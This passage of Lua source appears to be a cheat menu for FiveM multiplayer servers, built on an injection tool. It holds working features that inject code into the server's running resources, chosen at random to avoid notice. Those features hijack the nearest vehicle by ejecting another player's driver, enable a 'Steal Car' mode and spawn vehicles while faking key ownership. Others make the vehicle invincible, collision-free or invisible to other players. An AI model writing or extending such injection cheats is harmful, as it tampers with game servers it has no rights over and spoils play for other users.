                                                    RemoteCar.CameraAngleHorizontal = 0.0
                                                    RemoteCar.CameraAngleVertical = -10.0
                                                    local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                                    local cameraPos = vector3(
                                                        vehicleCoords.x,
                                                        vehicleCoords.y - 8.0,
                                                        vehicleCoords.z + 3.0
                                                    )
                                                    SetCamCoord(RemoteCar.SpectateCamera, cameraPos)
                                                    PointCamAtEntity(RemoteCar.SpectateCamera, RemoteCar.Entity, 0.0, 0.0, 0.0, true)
                                                end
                                            end
                                        end)
                                    end
                                    if IsControlJustPressed(0, 73) then
                                        RemoteCar.Stop()
                                        ClearFocus()
                                        return
                                    end
                                    if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                        local vehicleCoords = GetEntityCoords(RemoteCar.Entity)
                                        if vehicleCoords then
                                            SetFocusPosAndVel(vehicleCoords.x, vehicleCoords.y, vehicleCoords.z, 0.0, 0.0, 0.0)
                                        end
                                        pcall(function()
                                            if IsControlJustReleased(0, 26) then
                                                RemoteCar.MakeVehicleExplode()
                                            end
                                            RemoteCar.HandleHonking()
                                            if isFlying then
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local up = IsControlPressed(0, 22)
                                                local down = IsControlPressed(0, 36)
                                                local boost = IsControlPressed(0, 21)
                                                local heading = GetEntityHeading(RemoteCar.Entity)
                                                local radHeading = math.rad(heading)
                                                local moveX = 0.0
                                                local moveY = 0.0
                                                local moveZ = 0.0
                                                SetVehicleGravity(RemoteCar.Entity, false)
                                                SetEntityRotation(RemoteCar.Entity, 0.0, 0.0, heading, 2, true)
                                                if forward then
                                                    moveX = moveX - math.sin(radHeading) * flightSpeed
                                                    moveY = moveY + math.cos(radHeading) * flightSpeed
                                                end
                                                if backward then
                                                    moveX = moveX + math.sin(radHeading) * flightSpeed
                                                    moveY = moveY - math.cos(radHeading) * flightSpeed
                                                end
                                                if left then
                                                    heading = heading + 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if right then
                                                    heading = heading - 3.0
                                                    SetEntityHeading(RemoteCar.Entity, heading)
                                                end
                                                if up then
                                                    moveZ = moveZ + flightSpeed
                                                end
                                                if down then
                                                    moveZ = moveZ - flightSpeed
                                                end
                                                if boost then
                                                    moveX = moveX * 2.0
                                                    moveY = moveY * 2.0
                                                    moveZ = moveZ * 2.0
                                                end
                                                local currentCoords = GetEntityCoords(RemoteCar.Entity)
                                                local newCoords = vector3(
                                                    currentCoords.x + (moveX * 0.02),
                                                    currentCoords.y + (moveY * 0.02),
                                                    currentCoords.z + (moveZ * 0.02)
                                                )
                                                SetEntityCoordsNoOffset(RemoteCar.Entity, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                            else
                                                local boost = IsControlPressed(0, 21)
                                                local forward = IsControlPressed(0, 172) or IsControlPressed(0, 32)
                                                local backward = IsControlPressed(0, 173) or IsControlPressed(0, 33)
                                                local left = IsControlPressed(0, 174) or IsControlPressed(0, 34)
                                                local right = IsControlPressed(0, 175) or IsControlPressed(0, 35)
                                                local brake = IsControlPressed(0, 22)
                                                local actionTaken = false
                                                if boost and RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                    SetVehicleForwardSpeed(RemoteCar.Entity, GetEntitySpeed(RemoteCar.Entity) + 2.0)
                                                end
                                                if forward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 7, 1)
                                                    actionTaken = true
                                                elseif forward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 8, 1)
                                                    actionTaken = true
                                                elseif backward and left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 13, 1)
                                                    actionTaken = true
                                                elseif backward and right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 14, 1)
                                                    actionTaken = true
                                                elseif forward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 9, 1)
                                                    actionTaken = true
                                                elseif backward then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 22, 1)
                                                    actionTaken = true
                                                elseif left then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 4, 1)
                                                    actionTaken = true
                                                elseif right then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 5, 1)
                                                    actionTaken = true
                                                elseif brake then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 1000)
                                                    actionTaken = true
                                                end
                                                if not actionTaken then
                                                    TaskVehicleTempAction(RemoteCar.BotPed, RemoteCar.Entity, 6, 2500)
                                                end
                                            end
                                        end)
                                    end
                                end

                                RemoteCar.Stop = function()
                                    pcall(function()
                                        RemoteCar.StopSpectate()
                                        RemoteCar.RestoreOriginalAudio()
                                        if isFlying then
                                            isFlying = false
                                            SetVehicleGravity(RemoteCar.Entity, true)
                                            SetEntityCollision(RemoteCar.Entity, true, true)
                                            SetEntityCollision(RemoteCar.BotPed, true, true)
                                            local coords = GetEntityCoords(RemoteCar.Entity)
                                            SetEntityCoordsNoOffset(RemoteCar.Entity, coords.x, coords.y, coords.z, false, false, false)
                                            PlaceObjectOnGroundProperly(RemoteCar.Entity)
                                            SetEntityDynamic(RemoteCar.Entity, true)
                                            SetEntityDynamic(RemoteCar.BotPed, true)
                                        end
                                        if isHonking then
                                            isHonking = false
                                            if RemoteCar.Entity and DoesEntityExist(RemoteCar.Entity) then
                                                for i = 0, 3 do
                                                    SetVehicleDoorShut(RemoteCar.Entity, i, false)
                                                end
                                                SetVehicleLights(RemoteCar.Entity, originalLightState)
                                            end
                                        end
                                        ClearFocus()
                                        if RemoteCar.OriginalPed and DoesEntityExist(RemoteCar.OriginalPed) then
                                            local playerCoords = GetEntityCoords(RemoteCar.OriginalPed)
                                            SetFocusPosAndVel(playerCoords.x, playerCoords.y, playerCoords.z, 0.0, 0.0, 0.0)
                                            ClearFocus()
                                        end
                                        if RemoteCar.BotPed and DoesEntityExist(RemoteCar.BotPed) then
                                            DeleteEntity(RemoteCar.BotPed)
                                        end
                                        RemoteCar.Entity = nil
                                        RemoteCar.BotPed = nil
                                        RemoteCar.OriginalPed = nil
                                        audioEnabled = false
                                    end)
                                end

                                RemoteCar.Start()
                            end
                            SetEntityVisible(playerPed, true, false)
                        end
                    end)
                ]])
                MachoMenuNotification("Remote Car", "Started remote control for your vehicle")
            else
                MachoMenuNotification("Remote Car", "No resources found!")
            end
        else
            MachoMenuNotification("Error", "You are not in a vehicle")
        end
    end,
    
    -- CallbackDisabled: This code runs when the checkbox is unselected (disabling remote control)
    function()
        if menuDUI then
            MachoDestroyDui(menuDUI)
            menuDUI = nil
            menuVisible = false
            MachoMenuNotification("Remote Car", "Remote control session ended and menu closed.")
        end
    end
)
MachoMenuKeybind(oyer, "Flip keybind", 0, function(key, toggle)
    selectedKey = key
end)
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        local playerPed = GetPlayerPed(-1)
        if not DoesEntityExist(playerPed) then
            return
        end

        if IsPedSittingInAnyVehicle(playerPed) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            if DoesEntityExist(vehicle) then
                if selectedFlip == "Flip 1" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 360.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    if selectedFlip == "Flip 1" then
                        MachoMenuNotification("Success", "Flip 1  applied!")
                    end
                elseif selectedFlip == "Flip 2" then
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 10.5, 0.0, 270.0, 0.0, 0, 0, 1, 1, 0, 1)
                    MachoMenuNotification("Success", "Flip 2  applied!")
                end
            else
                MachoMenuNotification("Error", "Vehicle not found!")
            end
        end
    end
end)
-- متغير لحفظ المفتاح المختار
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Hijack Nearest Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- ✅ تحديث بيانات اللاعب داخل الدالة
        local nearestVehicle, distance = GetNearestVehicleWithPlayer()
        
        if nearestVehicle then
            local driverPed = GetPedInVehicleSeat(nearestVehicle, -1)
            
            ClearPedTasksImmediately(playerPed)
            
            MachoInjectResource("any", [[
                Citizen.CreateThread(function()
                    local playerPed = PlayerPedId()
                    local targetVehicle = ]] .. nearestVehicle .. [[
                    local driverPed = GetPedInVehicleSeat(targetVehicle, -1)
                    
                    if targetVehicle ~= 0 then
                        SetPedMoveRateOverride(playerPed, 10.0)
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        SetVehicleDoorsLocked(targetVehicle, 1)
                        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
                        
                        if driverPed then
                            TaskLeaveVehicle(driverPed, targetVehicle, 0)
                        end
                        
                        SetPedMoveRateOverride(playerPed, 3.0)
                        
                        ClearPedTasks(playerPed)
                        SetVehicleForwardSpeed(targetVehicle, 0.0)
                        
                        SetPedIntoVehicle(playerPed, targetVehicle, -1)
                        TaskEnterVehicle(playerPed, targetVehicle, 50, -1, 2.0, 8, 0)
                        
                        SetPedMoveRateOverride(playerPed, 1.0)
                    end
                end)
            ]])
            
            MachoMenuNotification("Vehicle", "Hijacking nearest vehicle with player (Distance: " .. math.floor(distance) .. "m)")
        else
            MachoMenuNotification("Error", "No vehicle with player found")
        end
    end
end)

MachoMenuText(oyer,"Vehicle settings")


-- دالة MaxOut كاملة (منسوخة من الكود الأصلي ومعدلة)
function MaxOut(vehicle)
    -- تفعيل kit التعديل
    SetVehicleModKit(vehicle, 0)
    SetVehicleWheelType(vehicle, 7)
    
    -- تطبيق جميع التعديلات الأساسية (0-16)
    SetVehicleMod(vehicle, 0, GetNumVehicleMods(vehicle, 0) - 1, false) -- Spoiler
    SetVehicleMod(vehicle, 1, GetNumVehicleMods(vehicle, 1) - 1, false) -- Front Bumper
    SetVehicleMod(vehicle, 2, GetNumVehicleMods(vehicle, 2) - 1, false) -- Rear Bumper
    SetVehicleMod(vehicle, 3, GetNumVehicleMods(vehicle, 3) - 1, false) -- Side Skirt
    SetVehicleMod(vehicle, 4, GetNumVehicleMods(vehicle, 4) - 1, false) -- Exhaust
    SetVehicleMod(vehicle, 5, GetNumVehicleMods(vehicle, 5) - 1, false) -- Frame
    SetVehicleMod(vehicle, 6, GetNumVehicleMods(vehicle, 6) - 1, false) -- Grille
    SetVehicleMod(vehicle, 7, GetNumVehicleMods(vehicle, 7) - 1, false) -- Hood
    SetVehicleMod(vehicle, 8, GetNumVehicleMods(vehicle, 8) - 1, false) -- Fender
    SetVehicleMod(vehicle, 9, GetNumVehicleMods(vehicle, 9) - 1, false) -- Right Fender
    SetVehicleMod(vehicle, 10, GetNumVehicleMods(vehicle, 10) - 1, false) -- Roof
    SetVehicleMod(vehicle, 11, GetNumVehicleMods(vehicle, 11) - 1, false) -- Engine
    SetVehicleMod(vehicle, 12, GetNumVehicleMods(vehicle, 12) - 1, false) -- Brakes
    SetVehicleMod(vehicle, 13, GetNumVehicleMods(vehicle, 13) - 1, false) -- Transmission
    SetVehicleMod(vehicle, 14, 16, false) -- Horn
    SetVehicleMod(vehicle, 15, GetNumVehicleMods(vehicle, 15) - 2, false) -- Suspension
    SetVehicleMod(vehicle, 16, GetNumVehicleMods(vehicle, 16) - 1, false) -- Armor
    
    -- تفعيل التعديلات الخاصة
    ToggleVehicleMod(vehicle, 17, true) -- Turbo
    ToggleVehicleMod(vehicle, 18, true) -- Tire Smoke
    ToggleVehicleMod(vehicle, 19, true) -- Xenon Lights
    ToggleVehicleMod(vehicle, 20, true) -- Front Wheels
    ToggleVehicleMod(vehicle, 21, true) -- Custom Tires
    ToggleVehicleMod(vehicle, 22, true) -- Bulletproof Tires
    
    -- تعديلات إضافية
    SetVehicleMod(vehicle, 23, 1, false) -- Front Wheels
    SetVehicleMod(vehicle, 24, 1, false) -- Back Wheels
    SetVehicleMod(vehicle, 25, GetNumVehicleMods(vehicle, 25) - 1, false) -- Plate Holder
    SetVehicleMod(vehicle, 27, GetNumVehicleMods(vehicle, 27) - 1, false) -- Trim Design
    SetVehicleMod(vehicle, 28, GetNumVehicleMods(vehicle, 28) - 1, false) -- Ornaments
    SetVehicleMod(vehicle, 30, GetNumVehicleMods(vehicle, 30) - 1, false) -- Dial Design
    SetVehicleMod(vehicle, 33, GetNumVehicleMods(vehicle, 33) - 1, false) -- Steering Wheel
    SetVehicleMod(vehicle, 34, GetNumVehicleMods(vehicle, 34) - 1, false) -- Shifter Leavers
    SetVehicleMod(vehicle, 35, GetNumVehicleMods(vehicle, 35) - 1, false) -- Plaques
    SetVehicleMod(vehicle, 38, GetNumVehicleMods(vehicle, 38) - 1, true) -- Hydraulics
    
    -- إعدادات النوافذ والإطارات
    SetVehicleWindowTint(vehicle, 1) -- Dark tint
    SetVehicleTyresCanBurst(vehicle, false) -- Bulletproof tires
    SetVehicleNumberPlateTextIndex(vehicle, 5) -- Plate style
    
    -- إضاءة النيون
    SetVehicleNeonLightEnabled(vehicle, 0, true) -- Left
    SetVehicleNeonLightEnabled(vehicle, 1, true) -- Right
    SetVehicleNeonLightEnabled(vehicle, 2, true) -- Front
    SetVehicleNeonLightEnabled(vehicle, 3, true) -- Back
    SetVehicleNeonLightsColour(vehicle, 222, 222, 255) -- Light blue color
end

-- Max Tuning Button
MachoMenuButton(oyer, "Max Tuning", function()
    local playerPed = PlayerPedId()
    
    -- التحقق من وجود اللاعب في سيارة
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        
        -- التحقق من وجود السيارة
        if DoesEntityExist(vehicle) then
            -- تطبيق التعديل الكامل
            MaxOut(vehicle)
            MachoMenuNotification("Max Tuning", "Vehicle fully tuned with all upgrades!")
        else
            MachoMenuNotification("Error", "Vehicle not found!")
        end
    else
        MachoMenuNotification("Error", "You must be in a vehicle to tune it!")
    end
end)


-- دالة إصلاح السيارة كاملة
local function cc()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleFixed(vehicle)
        SetVehicleDirtLevel(vehicle, 0.0)
        SetVehicleLights(vehicle, 0)
        SetVehicleBurnout(vehicle, false)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end

-- دالة إصلاح المحرك
local function cd()
    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
    if DoesEntityExist(vehicle) then
        SetVehicleEngineHealth(vehicle, 1000)
        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
        SetVehicleUndriveable(vehicle, false)
    end
end
-- زر القائمة لحذف السيارة

-- زر إصلاح السيارة كاملة
MachoMenuButton(oyer, "Repair Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cc()
        MachoMenuNotification("Repair", "Vehicle fully repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)



-- زر إصلاح المحرك
MachoMenuButton(oyer, "Repair Engine", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        cd()
        MachoMenuNotification("Repair", "Engine repaired!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)
MachoMenuButton(oyer, "Delete Vehicle", function()
    local playerPed = PlayerPedId()
    
    if IsPedInAnyVehicle(playerPed, false) then
        local vehicle = GetVehiclePedIsIn(playerPed, false)
        MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]])
        MachoMenuNotification("Delete", "Vehicle deleted successfully!")
    else
        MachoMenuNotification("Error", "You must be in a vehicle!")
    end
end)

-- متغير لحفظ المفتاح المختار
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Repair Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
            if IsPedInAnyVehicle(playerPed, false) then
                cc()
                MachoMenuNotification("Repair", "Vehicle fully repaired!")
            else
                MachoMenuNotification("Error", "You must be in a vehicle!")
            end
    end
end)
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Repair engine Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId()
    
        if IsPedInAnyVehicle(playerPed, false) then
            cd()
            MachoMenuNotification("Repair", "Engine repaired!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
local selectedKey = 0

-- إعداد المفتاح المخصص
MachoMenuKeybind(oyer, "Delete Vehicle Key", 0, function(key, toggle)
    selectedKey = key
end)

-- معالج الضغط على المفتاح
MachoOnKeyDown(function(key)
    if key == selectedKey then
        local playerPed = PlayerPedId() -- ✅ تحديث بيانات اللاعب داخل الدالة
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            MachoInjectResource("any",[[DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), false))]]) -- حذف السيارة
            MachoMenuNotification("Delete", "Vehicle deleted successfully!")
        else
            MachoMenuNotification("Error", "You must be in a vehicle!")
        end
    end
end)
MachoMenuCheckbox(VehicleCheck, "Steal Car", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId()
            SetPedConfigFlag(playerPed, 342, false)
            SetPedConfigFlag(playerPed, 252, true)
            SetPedConfigFlag(playerPed, 186, true)
            SetPedConfigFlag(playerPed, 187, true)
        ]])
        
        MachoMenuNotification("Player", " Steal Car Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId()
                SetPedConfigFlag(playerPed, 342, true)
                SetPedConfigFlag(playerPed, 252, false)
                SetPedConfigFlag(playerPed, 186, false)
                SetPedConfigFlag(playerPed, 187, false)
            ]])
            
            MachoMenuNotification("Player", "Steal Car Mode disabled")
        end
    end
)


MachoMenuText(oyer,"Vehicle Spawn")


-- Text input for Vehicle Model
local VehicleModelInput = MachoMenuInputbox(oyer, "Vehicle Model", "e.g., sultan")

-- Variable for giving key
local GiveKey = false

-- Vehicle Creation Button (with automatic key giving)
MachoMenuButton(oyer, "Create Vehicle", function()
    local modelName = MachoMenuGetInputbox(VehicleModelInput)

    if modelName and modelName ~= "" then
        MachoInjectResource("any", string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                -- Always give key
                local plate = GetVehicleNumberPlateText(vehicle)
                TriggerEvent("vehiclekeys:client:SetOwner", plate)
                TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]], modelName, modelName))

        MachoMenuNotification("Vehicle System", "Vehicle created and key given!")
    else
        MachoMenuNotification("Error", "Enter a valid vehicle model!")
    end
end)


local antiKnockOffLoop = false

MachoMenuCheckbox(VehicleCheck, "Seat belt", 
   function()
       antiKnockOffLoop = true
       MachoMenuNotification("Seat belt", "Activated")
       
       Citizen.CreateThread(function()
           while antiKnockOffLoop do
               local playerPed = PlayerPedId()
               SetPedCanBeKnockedOffVeh(playerPed, false)
               Citizen.Wait(100)
           end
           
           -- Restore when disabled
           local playerPed = PlayerPedId()
           SetPedCanBeKnockedOffVeh(playerPed, true)
       end)
   end,
   function()
       antiKnockOffLoop = false
       MachoMenuNotification("Seat belt", "Deactivated")
   end
)


MachoMenuCheckbox(VehicleCheck, "Rainbow Vehicle Colour", 
    function()
        RainbowCar = true
        MachoMenuNotification("Rainbow Car", "Activated")
        
        Citizen.CreateThread(function()
            while RainbowCar do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    local rainbowColor = getRainbowColor()
                    
                    -- Set primary color
                    SetVehicleCustomPrimaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                    
                    -- Set secondary color
                    SetVehicleCustomSecondaryColour(
                        vehicle,
                        rainbowColor.r,
                        rainbowColor.g,
                        rainbowColor.b
                    )
                end
                
                Citizen.Wait(50) -- Update every 50ms for smooth rainbow effect
            end
        end)
    end,
    function()
        RainbowCar = false
        MachoMenuNotification("Rainbow Car", "Deactivated")
    end
)


-- Horn Boost Checkbox
local HornBoost = false

MachoMenuCheckbox(VehicleCheck, "Horn Boost", 
    function()
        HornBoost = true
        MachoMenuNotification("Horn Boost", "Activated - Press E while in vehicle")
        
        Citizen.CreateThread(function()
            while HornBoost do
                if HornBoost and IsPedInAnyVehicle(PlayerPedId(), true) then
                    if IsControlPressed(1, 38) then -- E key
                        SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 80.0)
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        HornBoost = false
        MachoMenuNotification("Horn Boost", "Deactivated")
    end
)


-- Vehicle Bunny Hop Checkbox
local JumpMod = false

MachoMenuCheckbox(VehicleCheck, "Vehicle  Jump {SPACE}", 
    function()
        JumpMod = true
        MachoMenuNotification("Vehicle Bunny Hop", "Activated - Press SPACE to jump")
        
        Citizen.CreateThread(function()
            while JumpMod do
                if JumpMod and IsPedInAnyVehicle(PlayerPedId(), false) then
                    if IsControlJustPressed(1, 22) then -- SPACE key
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0.0)
                        ApplyForceToEntity(
                            vehicle,
                            3,
                            0.0, -- X force
                            0.0, -- Y force
                            9.0, -- Z force (upward)
                            0.0, -- X offset
                            0.0, -- Y offset
                            0.0, -- Z offset
                            0.0,
                            0.0,
                            1,
                            1,
                            0.0,
                            1
                        )
                    end
                end
                Citizen.Wait(0)
            end
        end)
    end,
    function()
        JumpMod = false
        MachoMenuNotification("Vehicle Bunny Hop", "Deactivated")
    end
)
local GhostNoSideCollision = false

MachoMenuCheckbox(VehicleCheck, "Ghost Vehicle (Only Collides With Ground)", 
    function()
        GhostNoSideCollision = true
        MachoMenuNotification("Ghost Mode", "Activated - Only collides with ground")

        Citizen.CreateThread(function()
            while GhostNoSideCollision do
                local ped = PlayerPedId()
                if IsPedInAnyVehicle(ped, false) then
                    local vehicle = GetVehiclePedIsIn(ped, false)

                    -- تعطيل الاصطدام مؤقتاً بالكامل
                    SetEntityCollision(vehicle, false, false)

                    -- إعادة التجميد لحظة لتحديث التعارض
                    FreezeEntityPosition(vehicle, true)
                    FreezeEntityPosition(vehicle, false)

                    -- نحافظ على تأثير الجاذبية
                    SetEntityHasGravity(vehicle, true)
                    SetVehicleOnGroundProperly(vehicle)

                    -- نخلي السيارة تمر من كل شيء، لكن تبقى على الأرض
                    local vehicles = GetGamePool("CVehicle")
                    for _, otherVeh in ipairs(vehicles) do
                        if otherVeh ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, otherVeh, true)
                            SetEntityNoCollisionEntity(otherVeh, vehicle, true)
                        end
                    end

                    local peds = GetGamePool("CPed")
                    for _, otherPed in ipairs(peds) do
                        local ent = GetVehiclePedIsIn(otherPed, false)
                        if ent ~= 0 and ent ~= vehicle then
                            SetEntityNoCollisionEntity(vehicle, ent, true)
                            SetEntityNoCollisionEntity(ent, vehicle, true)
                        end
                    end
                end
                Citizen.Wait(500)
            end
        end)
    end,
    function()
        GhostNoSideCollision = false
        MachoMenuNotification("Ghost Mode", "Deactivated - Collision restored")

        local ped = PlayerPedId()
        if IsPedInAnyVehicle(ped, false) then
            local vehicle = GetVehiclePedIsIn(ped, false)

            -- إعادة الاصطدام
            SetEntityCollision(vehicle, true, true)
            FreezeEntityPosition(vehicle, true)
            FreezeEntityPosition(vehicle, false)
        end
    end
)






-- تعريف المتغير
local VehGood = false

-- تشيك بوكس ماتشو
MachoMenuCheckbox(VehicleCheck, "Vehicle Godmode", 
    function()
        VehGood = true
    end,
    function()
        VehGood = false
    end
)

-- الـ loop الرئيسي (يشتغل في الـ main thread)
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        
        if VehGood and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), true)
        end
    end
end)
local vehicleInvisibilityAlpha = 255 -- القيمة الافتراضية (مرئي بالكامل)
local vehicleInvisibilityLoop = false
local selectedVehicleKey = 0

local VehicleInvisibilitySlider = MachoMenuSlider(VehicleCheck, "Vehicle Invisibility Level", 255, 0, 255, "%", 0, function(Value)
    vehicleInvisibilityAlpha = Value
    
    -- تطبيق التغيير فوراً إذا كان الاختفاء مفعل
    if vehicleInvisibilityLoop then
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            
            -- للكلاينت: التحكم في الشفافية
            if vehicleInvisibilityAlpha == 0 then
                SetEntityVisible(vehicle, false, false)
            else
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
            end
        end
    end
end)

-- Checkbox للتفعيل/الإلغاء
MachoMenuCheckbox(VehicleCheck, "Vehicle Invisible",
    function()
        vehicleInvisibilityLoop = true
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            MachoMenuNotification("Vehicle Invisible", "Activated - Alpha: " .. vehicleInvisibilityAlpha)
        else
            MachoMenuNotification("Vehicle Invisible", "You need to be in a vehicle!")
            vehicleInvisibilityLoop = false
            return
        end
        
        CreateThread(function()
            while vehicleInvisibilityLoop do
                local playerPed = PlayerPedId()
                
                if IsPedInAnyVehicle(playerPed, false) then
                    local vehicle = GetVehiclePedIsIn(playerPed, false)
                    
                    -- للآخرين: إخفاء كامل دائماً
                    SetEntityVisible(vehicle, false, false)
                    
                    -- للكلاينت فقط: جعل السيارة مرئية محلياً
                    SetEntityLocallyVisible(vehicle)
                    
                    -- تطبيق مستوى الشفافية للكلاينت
                    if vehicleInvisibilityAlpha == 0 then
                        SetEntityAlpha(vehicle, 0, false)
                    else
                        SetEntityAlpha(vehicle, vehicleInvisibilityAlpha, false)
                    end
                else
                    -- إذا خرج من السيارة، أوقف الاختفاء
                    vehicleInvisibilityLoop = false
                    MachoMenuNotification("Vehicle Invisible", "Deactivated - Left vehicle")
                end
                
                Wait(0)
            end
            
            -- إرجاع السيارة للحالة الطبيعية عند الإلغاء
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                SetEntityVisible(vehicle, true, false)
                SetEntityAlpha(vehicle, 255, false)
            end
        end)
    end,
    function()
        vehicleInvisibilityLoop = false
        MachoMenuNotification("Vehicle Invisible", "Deactivated")
        
        -- إرجاع السيارة للحالة الطبيعية
        local playerPed = PlayerPedId()
        if IsPedInAnyVehicle(playerPed, false) then
            local vehicle = GetVehiclePedIsIn(playerPed, false)
            SetEntityVisible(vehicle, true, false)
            SetEntityAlpha(vehicle, 255, false)
        end
    end
)

-- Keybind للاختصار
MachoMenuKeybind(VehicleCheck, "Vehicle Invisible Key", 0, function(key, toggle)
    selectedVehicleKey = key
end)

-- وظيفة الاختصار
MachoOnKeyDown(function(key)
    if key == selectedVehicleKey and selectedVehicleKey ~= 0 then
